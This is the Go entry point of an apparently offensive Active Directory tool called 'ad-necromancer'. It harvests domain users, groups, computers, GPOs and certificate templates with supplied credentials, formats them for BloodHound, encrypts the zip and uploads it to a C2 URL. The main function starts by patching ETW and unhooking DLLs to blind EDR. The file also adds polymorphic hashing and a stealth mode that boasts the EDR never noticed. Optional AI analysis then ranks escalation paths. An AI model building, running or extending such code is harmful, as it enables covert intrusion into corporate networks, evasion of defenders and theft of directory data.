//go:build windows

package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"ad-necromancer/internal/ai"
	"ad-necromancer/internal/bh"
	"ad-necromancer/internal/bloodhound"
	"ad-necromancer/internal/claude"
	"ad-necromancer/internal/collector"
	"ad-necromancer/internal/crypto"
	"ad-necromancer/internal/deepseek"
	"ad-necromancer/internal/evasion"
	"ad-necromancer/internal/exfil"
	"ad-necromancer/internal/gemini"
	"ad-necromancer/internal/necromancy"
	"ad-necromancer/internal/ollama"
	"ad-necromancer/internal/openai"
	_ "ad-necromancer/internal/phantom" // embed random pad + BuildID for polymorphic hashing
	"ad-necromancer/internal/privacy"
	"ad-necromancer/internal/prompts"
)

// ANSI Color Codes
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorPurple = "\033[35m"
	ColorCyan   = "\033[36m"
	ColorOrange = "\033[38;5;208m"
	ColorBold   = "\033[1m"
)

func main() {
	// ---- Flags ----
	var (
		// Collection
		username string
		domain   string
		password string
		dc       string
		method   string

		// Legacy: offline JSON analysis mode
		dataDir    string
		sampleSize int

		// Output
		localMode  bool
		exfilURL   string

		// Analysis (AI)
		analyze     bool
		useOpenAI   bool
		useGemini   bool
		useClaude   bool
		onPremise   bool

		// Evasion
		stealth   bool
		noUnhook  bool
		noETWPatch bool

		// Privacy
		noPrivacyCloak bool
		saveMapping    bool
		debugMode      bool
	)

	// Collection flags
	flag.StringVar(&username, "u", "", "AD username")
	flag.StringVar(&username, "username", "", "AD username (long form)")
	flag.StringVar(&domain, "d", "", "AD domain FQDN (e.g. corp.local)")
	flag.StringVar(&domain, "domain", "", "AD domain FQDN (long form)")
	flag.StringVar(&password, "p", "", "AD password")
	flag.StringVar(&password, "password", "", "AD password (long form)")
	flag.StringVar(&dc, "dc", "", "Domain controller hostname/IP (optional, auto-discovers)")
	flag.StringVar(&method, "method", "auto", "Collection method: adws | ldap | auto")

	// Legacy offline mode
	flag.StringVar(&dataDir, "data", "", "Offline mode: path to BloodHound JSON files directory")
	flag.IntVar(&sampleSize, "sample-size", 20, "AI entity sample size")

	// Output flags
	flag.BoolVar(&localMode, "local", true, "Save encrypted adn_data.zip locally")
	flag.StringVar(&exfilURL, "exfil", "", "HTTPS C2 URL for encrypted zip upload")

	// Analysis flags
	flag.BoolVar(&analyze, "analyze", false, "Run AI necromancy analysis on collected data")
	flag.BoolVar(&useOpenAI, "openai", false, "Use OpenAI backend")
	flag.BoolVar(&useGemini, "gemini", false, "Use Gemini backend")
	flag.BoolVar(&useClaude, "claude", false, "Use Claude backend")
	flag.BoolVar(&onPremise, "on-premise", false, "Use Ollama (local) backend")

	// Evasion flags
	flag.BoolVar(&stealth, "stealth", false, "Enable maximum evasion + minimal logging")
	flag.BoolVar(&noUnhook, "no-unhook", false, "Disable DLL unhooking (debug)")
	flag.BoolVar(&noETWPatch, "no-etw-patch", false, "Disable ETW patching (debug)")

	// Privacy flags
	flag.BoolVar(&noPrivacyCloak, "no-privacy-cloak", false, "Disable privacy tokenization")
	flag.BoolVar(&saveMapping, "save-mapping", false, "Save tokenization mapping to disk")
	flag.BoolVar(&debugMode, "debug", false, "Show AI payload (verify Privacy Cloak)")

	flag.Parse()

	// ---- Phase 0: Evasion Bootstrap ----
	// Run ASAP — before any network ops, any prints in stealth mode.
	evasion.Bootstrap(noUnhook, noETWPatch)

	// ---- Banner ----
	if !stealth {
		printBannerV2()
	}

	// ---- Determine mode ----
	offlineMode := dataDir != ""
	liveMode := domain != "" && username != "" && password != ""

	if !offlineMode && !liveMode {
		if !stealth {
			fmt.Println(ColorRed + "[!] Provide credentials (-u/-d/-p) for live collection, or --data for offline analysis." + ColorReset)
		}
		flag.Usage()
		os.Exit(1)
	}

	// ---- Phase 1: Data Collection ----
	var adData *bh.ADData

	if liveMode {
		if !stealth {
			fmt.Printf(ColorCyan+"[*] Target: %s@%s\n"+ColorReset, username, domain)
			fmt.Printf(ColorCyan+"[*] Method: %s\n"+ColorReset, strings.ToUpper(method))
		}

		cfg := collector.Config{
			Domain:   domain,
			DC:       dc,
			Username: username,
			Password: password,
			Method:   collector.Method(method),
			Stealth:  stealth,
		}

		var err error
		adData, err = collector.Collect(cfg)
		if err != nil {
			log.Fatalf(ColorRed+"[!] Collection failed: %v"+ColorReset, err)
		}

		if !stealth {
			fmt.Printf(ColorGreen+"[+] Collected: %d Users, %d Groups, %d Computers, %d Domains, %d GPOs, %d OUs, %d CertTemplates, %d EnterpriseCAs\n"+ColorReset,
				len(adData.Users), len(adData.Groups), len(adData.Computers),
				len(adData.Domains), len(adData.GPOs), len(adData.OUs),
				len(adData.CertTemplates), len(adData.EnterpriseCAs))
		}

		// ---- Phase 2: Format to BloodHound CE v6 JSON ----
		formatter := bh.NewFormatter(adData)
		files, err := formatter.FormatAll()
		if err != nil {
			log.Fatalf(ColorRed+"[!] BH format failed: %v"+ColorReset, err)
		}

		// ---- Phase 3: AES-256-GCM Encrypt + Zip ----
		ez, err := crypto.BuildEncryptedZip(files)
		if err != nil {
			log.Fatalf(ColorRed+"[!] Crypto failed: %v"+ColorReset, err)
		}

		// ---- Phase 4: Exfil ----
		// When --exfil is set, data goes straight to C2 — no local artifacts.
		// Local .zip + .key are only saved when operating without a C2 endpoint.
		saveLocal := localMode && exfilURL == ""

		if saveLocal {
			if err := exfil.SaveLocal(ez, "adn_data.zip"); err != nil {
				log.Fatalf(ColorRed+"[!] Save failed: %v"+ColorReset, err)
			}

			// Save decryption key to timestamped file — never print it to console.
			keyFile := exfil.KeyFileName()
			if err := exfil.SaveKey(ez, keyFile); err != nil {
				fmt.Printf(ColorRed+"[!] CRITICAL: Could not save key file: %v"+ColorReset+"\n", err)
				fmt.Println(ColorRed + "[!] Data is UNRECOVERABLE without the decryption key!" + ColorReset)
			} else if stealth {
				fmt.Printf("[key]→%s\n", keyFile)
			} else {
				printKeyBox(keyFile)
			}
		}

		if exfilURL != "" {
			if !stealth {
				fmt.Printf(ColorCyan+"[*] Uploading to C2: %s\n"+ColorReset, exfilURL)
			}
			if err := exfil.UploadHTTPS(ez, exfilURL); err != nil {
				if !stealth {
					fmt.Printf(ColorYellow+"[!] Exfil failed: %v\n"+ColorReset, err)
				}
			} else if !stealth {
				fmt.Println(ColorGreen + "[+] Exfil complete." + ColorReset)
			}
		}
	}

	// Stealth-mode easter egg — only after a clean, complete run.
	if stealth && liveMode {
		fmt.Println("[?] Where is the EDR...? Still sleeping peacefully... didn't even notice us 😴")
	}

	// ---- Phase 5: AI Necromancy Analysis (optional --analyze flag) ----
	if analyze {
		if !stealth {
			fmt.Println(ColorPurple + "\n[*] Initiating Necromancy ritual..." + ColorReset)
		}

		// Build the old bloodhound.Loader-compatible data from adData or offline files
		var loader *bloodhound.Loader
		if offlineMode {
			loader = bloodhound.NewLoader()
			if err := loader.LoadFromDirectory(dataDir); err != nil {
				log.Fatalf(ColorRed+"[!] Failed to load data: %v"+ColorReset, err)
			}
		} else if adData != nil {
			// Convert collected bh.ADData back to bloodhound.BloodHoundData for the existing engine
			loader = adDataToLoader(adData)
		}

		// Initialize AI backend
		var aiClient ai.AIClient
		var err error
		if onPremise {
			aiClient, err = ollama.NewClient()
		} else if useClaude {
			aiClient, err = claude.NewClient()
		} else if useGemini {
			aiClient, err = gemini.NewClient()
		} else if useOpenAI {
			aiClient, err = openai.NewClient()
		} else {
			aiClient, err = deepseek.NewClient()
		}
		if err != nil {
			log.Fatalf(ColorRed+"[!] AI backend init failed: %v"+ColorReset, err)
		}

		// Privacy cloak
		var tokenizer *privacy.Tokenizer
		cloakEnabled := !noPrivacyCloak && !onPremise
		if cloakEnabled {
			tokenizer = privacy.NewTokenizer()
			if !stealth {
				fmt.Println(ColorGreen + "[🔒] Privacy Cloak: ENABLED" + ColorReset)
			}
		}

		engine := necromancy.NewEngine(loader, aiClient)
		engine.Tokenizer = tokenizer
		engine.CloakEnabled = cloakEnabled
		engine.DebugMode = debugMode

		paths, err := engine.ResurrectWithSampleSize(sampleSize)
		if err != nil {
			log.Fatalf(ColorRed+"[!] Necromancy failed: %v"+ColorReset, err)
		}

		if !stealth {
			printPaths(paths)
		}

		// Save prompt used for reference
		_ = prompts.NecromancerSystemPrompt

		// Save mapping if requested
		if saveMapping && cloakEnabled && tokenizer != nil {
			runID := privacy.GenerateRunID()
			if err := tokenizer.SaveMapping(runID); err != nil {
				fmt.Printf(ColorYellow+"[!] Failed to save mapping: %v\n"+ColorReset, err)
			}
		}
	}

	if !stealth {
		fmt.Println(ColorPurple + "\n[💀] The dead have spoken." + ColorReset)
	}
}

// adDataToLoader converts collected bh.ADData into a bloodhound.Loader for the AI engine.
func adDataToLoader(data *bh.ADData) *bloodhound.Loader {
	loader := bloodhound.NewLoader()

	toNodes := func(nodes []bh.Node) []bloodhound.Node {
		out := make([]bloodhound.Node, 0, len(nodes))
		for _, n := range nodes {
			out = append(out, bloodhound.Node{
				ObjectIdentifier: n.ObjectIdentifier,
				Properties: bloodhound.Properties{
					Name:              n.Properties.Name,
					Domain:            n.Properties.Domain,
					Description:       n.Properties.Description,
					DistinguishedName: n.Properties.DistinguishedName,
					HighValue:         n.Properties.HighValue,
					AdminCount:        n.Properties.AdminCount,
					Enabled:           n.Properties.Enabled,
					PasswordLastSet:   n.Properties.PasswordLastSet,
					OperatingSystem:   n.Properties.OperatingSystem,
				},
			})
		}
		return out
	}

	loader.Data.Users = toNodes(data.Users)
	loader.Data.Groups = toNodes(data.Groups)
	loader.Data.Computers = toNodes(data.Computers)
	loader.Data.Domains = toNodes(data.Domains)
	loader.Data.GPOs = toNodes(data.GPOs)
	loader.Data.OUs = toNodes(data.OUs)
	loader.Data.CertTemplates = toNodes(data.CertTemplates)
	loader.Data.EnterpriseCAs = toNodes(data.EnterpriseCAs)

	return loader
}

func printBannerV2() {
	banner := `
  ███╗   ██╗███████╗ ██████╗██████╗  ██████╗ ███╗   ███╗ █████╗ ███╗   ██╗ ██████╗███████╗██████╗     ██╗   ██╗██████╗ 
  ████╗  ██║██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗ ████║██╔══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗    ██║   ██║╚════██╗
  ██╔██╗ ██║█████╗  ██║     ██████╔╝██║   ██║██╔████╔██║███████║██╔██╗ ██║██║     █████╗  ██████╔╝    ██║   ██║ █████╔╝
  ██║╚██╗██║██╔══╝  ██║     ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║     ██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██╔═══╝ 
  ██║ ╚████║███████╗╚██████╗██║  ██║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║ ╚████║╚██████╗███████╗██║  ██║     ╚████╔╝ ███████╗
  ╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚══════╝`
	fmt.Println(ColorRed + banner + ColorReset)
	fmt.Println(ColorRed + "  ╔══════════════════════════════════════════════════════════════════════════════════════╗" + ColorReset)
	fmt.Println(ColorRed + "  ║" + ColorReset + ColorBold + "  v2 · Privilege Archaeology Engine  ·  DEFCON Research Edition                     " + ColorReset + ColorRed + "║" + ColorReset)
	fmt.Println(ColorRed + "  ║" + ColorReset + ColorCyan  + "  Protocol  : ADWS-First (MC-NMF/NTLM) → LDAP Ghosting fallback                     " + ColorReset + ColorRed + "║" + ColorReset)
	fmt.Println(ColorRed + "  ║" + ColorReset + ColorCyan  + "  Evasion   : ETW patch · DLL unhook · Direct syscalls (Halos Gate)                  " + ColorReset + ColorRed + "║" + ColorReset)
	fmt.Println(ColorRed + "  ║" + ColorReset + ColorCyan  + "  Output    : AES-256-GCM encrypted zip · key never printed to console               " + ColorReset + ColorRed + "║" + ColorReset)
	fmt.Println(ColorRed + "  ║" + ColorReset + ColorPurple+ "  \"Humans forget. Directories do not.\"                                               " + ColorReset + ColorRed + "║" + ColorReset)
	fmt.Println(ColorRed + "  ╚══════════════════════════════════════════════════════════════════════════════════════╝" + ColorReset)
	fmt.Println()
}

func printPaths(paths []necromancy.ZombiePath) {
	for _, p := range paths {
		riskColor := ColorGreen
		switch p.Probability {
		case "Critical":
			riskColor = ColorRed
		case "High":
			riskColor = ColorOrange
		case "Medium":
			riskColor = ColorYellow
		}
		fmt.Println(ColorRed + "╔══════════════════════════════════════════════════════════════════════════════╗" + ColorReset)
		fmt.Printf(ColorRed+"║ %s☠  %-74s%s║\n"+ColorReset, riskColor, p.Probability+" — "+p.Title, ColorRed)
		fmt.Println(ColorRed + "╚══════════════════════════════════════════════════════════════════════════════╝" + ColorReset)

		if p.EntityName != "" {
			fmt.Printf(ColorCyan+"[ENTITY]"+ColorReset+" %s%s%s (%s)\n", ColorPurple, p.EntityName, ColorReset, p.EntityType)
		}
		if p.Reasoning != "" {
			fmt.Println(ColorCyan + "[SECURITY INTERPRETATION]" + ColorReset)
			for _, line := range splitBullets(p.Reasoning) {
				fmt.Printf("  ▸ %s\n", line)
			}
		}
		if p.VisualPath != "" {
			fmt.Println(ColorCyan + "[UNDEAD CONTROL PATH]" + ColorReset)
			fmt.Println(p.VisualPath)
		}
		if len(p.ExecutionVectors) > 0 {
			fmt.Println(ColorCyan + "[EXECUTION VECTORS]" + ColorReset)
			for _, v := range p.ExecutionVectors {
				fmt.Printf("  • %s\n", v)
			}
		}
		if p.Mitigation != "" {
			fmt.Println(ColorGreen + "[MITIGATION]" + ColorReset)
			fmt.Printf("  %s\n", p.Mitigation)
		}
		fmt.Println(ColorCyan + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" + ColorReset)
		fmt.Println()
	}
}

func splitBullets(text string) []string {
	if strings.Contains(text, "\n") {
		var out []string
		for _, l := range strings.Split(text, "\n") {
			l = strings.TrimSpace(l)
			if l != "" {
				out = append(out, l)
			}
		}
		return out
	}
	return []string{text}
}

// printKeyBox prints a clean, boxed notification that the key has been saved.
// The actual key hex is NEVER displayed — only the filename.
func printKeyBox(keyFile string) {
	sep := "  ╔══════════════════════════════════════════════════════════╗"
	bot := "  ╚══════════════════════════════════════════════════════════╝"
	fmt.Println()
	fmt.Println(ColorGreen + sep + ColorReset)
	fmt.Println(ColorGreen + "  ║" + ColorReset + ColorBold + "  🔐 ENCRYPTED DATA SAVED                                 " + ColorReset + ColorGreen + "║" + ColorReset)
	fmt.Println(ColorGreen + "  ║" + ColorReset + ColorReset + "                                                          " + ColorGreen + "║" + ColorReset)
	fmt.Printf(ColorGreen+"  ║"+ColorReset+ColorYellow+"  Payload  : adn_data.zip (AES-256-GCM)                   "+ColorReset+ColorGreen+"║\n"+ColorReset)
	fmt.Printf(ColorGreen+"  ║"+ColorReset+ColorYellow+"  Key file : %-44s  "+ColorReset+ColorGreen+"║\n"+ColorReset, keyFile)
	fmt.Println(ColorGreen + "  ║" + ColorReset + ColorReset + "                                                          " + ColorGreen + "║" + ColorReset)
	fmt.Println(ColorGreen + "  ║" + ColorReset + ColorRed + "  ⚠  Keep this key safe.                                  " + ColorReset + ColorGreen + "║" + ColorReset)
	fmt.Println(ColorGreen + "  ║" + ColorReset + ColorRed + "     It will NOT be saved automatically anywhere else.    " + ColorReset + ColorGreen + "║" + ColorReset)
	fmt.Println(ColorGreen + bot + ColorReset)
	fmt.Println()
}
